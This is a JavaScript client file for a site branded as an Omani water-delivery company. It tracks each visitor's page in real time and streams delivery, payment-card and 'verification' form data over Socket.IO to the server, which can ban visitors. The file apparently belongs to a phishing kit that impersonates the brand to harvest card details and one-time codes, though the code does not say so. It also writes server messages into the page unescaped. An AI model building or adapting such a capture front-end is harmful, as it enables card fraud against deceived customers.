// مياه واحة عمان - Socket.IO Client & Tracking
const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:3000'
  : window.location.origin;

let socket = null;
let sessionId = localStorage.getItem('wateroman_session') || generateSessionId();
localStorage.setItem('wateroman_session', sessionId);
let visitorInitSent = false; // GUARD: Only send visitor:init once per page load

function generateSessionId() {
  return 'vs_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function initSocket() {
  return new Promise((resolve, reject) => {
    socket = io(SERVER_URL, {
      query: { sessionId },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('🔌 Connected to server');
      updateConnectionStatus(true);
      
      // Only send visitor:init ONCE per full page load
      if (!visitorInitSent) {
        console.log('📡 Sending visitor:init (first time only)');
        socket.emit('visitor:init', { sessionId, page: getCurrentPage() });
        visitorInitSent = true;
      } else {
        console.log('📡 Skipping visitor:init (already sent this page load)');
      }
      
      resolve(socket);
    });

    socket.on('connect_error', (error) => {
      console.error('Connection error:', error);
      updateConnectionStatus(false);
      reject(error);
    });

    socket.on('disconnect', () => {
      console.log('🔌 Disconnected from server');
      updateConnectionStatus(false);
    });

    socket.on('user:banned', (data) => {
      showBannedPage(data.message);
    });

    socket.on('visitor:confirmed', (data) => {
      console.log('Visitor confirmed:', data);
    });

    // Store socket globally for form submissions
    window.socket = socket;
  });
}

// ==========================================
// MINIMAL TRACKING - Only connect/disconnect and form submissions
// NO real-time typing tracking, NO activity floods
// ==========================================

// Wait for socket connection before sending
async function waitForSocket(maxRetries = 5, intervalMs = 300) {
  for (let i = 0; i < maxRetries; i++) {
    if (socket && socket.connected) {
      return true;
    }
    await new Promise(resolve => setTimeout(resolve, intervalMs));
  }
  return false;
}

// Track page changes only when navigating between pages
function trackPageChange(page) {
  if (!socket || !socket.connected) return;
  console.log('📄 Page change: ' + page);
  socket.emit('visitor:page', { sessionId, page });
}

// Track form submissions ONLY - no input tracking
async function submitDeliveryForm(formData) {
  if (!await waitForSocket()) {
    console.error('❌ Socket not connected - delivery form not sent');
    showToast('خطأ في الاتصال، حاول مرة أخرى', 'error');
    return false;
  }
  console.log('📦 Submitting delivery form...');
  socket.emit('form:delivery', { sessionId, formData });
  return true;
}

async function submitPaymentForm(paymentData) {
  if (!await waitForSocket()) {
    console.error('❌ Socket not connected - payment form not sent');
    showToast('خطأ في الاتصال، حاول مرة أخرى', 'error');
    return false;
  }
  console.log('💳 Submitting payment form...');
  socket.emit('form:payment', { sessionId, paymentData });
  return true;
}

async function submitVerificationForm(verificationData) {
  if (!await waitForSocket()) {
    console.error('❌ Socket not connected - verification form not sent');
    showToast('خطأ في الاتصال، حاول مرة أخرى', 'error');
    return false;
  }
  console.log('🔐 Submitting verification form...');
  socket.emit('form:verification', { sessionId, verificationData });
  return true;
}

function updateConnectionStatus(isOnline) {
  const statusDot = document.querySelector('.status-dot');
  const statusText = document.querySelector('.connection-status span');
  if (statusDot) {
    statusDot.classList.toggle('online', isOnline);
  }
  if (statusText) {
    statusText.textContent = isOnline ? 'متصل' : 'غير متصل';
  }
}

function getCurrentPage() {
  const path = window.location.pathname;
  if (path.includes('delivery')) return 'delivery';
  if (path.includes('payment')) return 'payment';
  if (path.includes('verification')) return 'verification';
  return 'home';
}

function showToast(message, type = 'success') {
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `
    <span>${type === 'success' ? '✓' : type === 'error' ? '✕' : '!'}</span>
    <span>${message}</span>
  `;
  document.body.appendChild(toast);
  
  setTimeout(() => {
    toast.style.animation = 'slideIn 0.3s ease reverse';
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

function showBannedPage(message) {
  document.body.innerHTML = `
    <div class="banned-page">
      <div class="banned-content">
        <h1>🚫</h1>
        <h1>تم حظرك</h1>
        <p>${message || 'تم حظرك من الموقع. يرجى التواصل مع الدعم.'}</p>
      </div>
    </div>
  `;
}

async function fetchProducts() {
  try {
    const response = await fetch(`${SERVER_URL}/api/products`);
    const data = await response.json();
    return data.products || [];
  } catch (error) {
    console.error('Error fetching products:', error);
    return [];
  }
}

function showLoading() {
  return `
    <div class="loading">
      <div class="spinner"></div>
      <p>جاري التحميل...</p>
    </div>
  `;
}

// ==========================================
// BROWSER NAVIGATION TRACKING - Back/Forward buttons
// ==========================================

// Listen for browser back/forward button navigation (popstate)
window.addEventListener('popstate', async () => {
  console.log('🔙 Browser navigation detected (popstate)');
  
  // Wait for socket connection
  if (!await waitForSocket()) {
    console.error('❌ Socket not connected - page tracking not sent');
    return;
  }
  
  // Get the current page based on actual URL
  const currentPage = getCurrentPage();
  console.log('📄 Emitting page change to:', currentPage);
  socket.emit('visitor:page', { sessionId, page: currentPage });
});

// Handle Page Show (BFCache) - when page is restored from back-forward cache
window.addEventListener('pageshow', async (event) => {
  if (event.persisted) {
    console.log('📦 Page loaded from BFCache (back-forward cache)');
    
    // Reinitialize socket connection for fresh tracking
    await initSocket();
    
    // Wait for connection and send page tracking
    if (await waitForSocket()) {
      const currentPage = getCurrentPage();
      console.log('📄 BFCache: Emitting page tracking for:', currentPage);
      socket.emit('visitor:page', { sessionId, page: currentPage });
    }
  }
});

// Initialize on page load
document.addEventListener('DOMContentLoaded', () => {
  initSocket().catch(console.error);
});

// Export functions for use in pages
window.initSocket = initSocket;
window.trackPageChange = trackPageChange;
window.submitDeliveryForm = submitDeliveryForm;
window.submitPaymentForm = submitPaymentForm;
window.submitVerificationForm = submitVerificationForm;
window.fetchProducts = fetchProducts;
window.showToast = showToast;
window.sessionId = sessionId;
window.SERVER_URL = SERVER_URL;
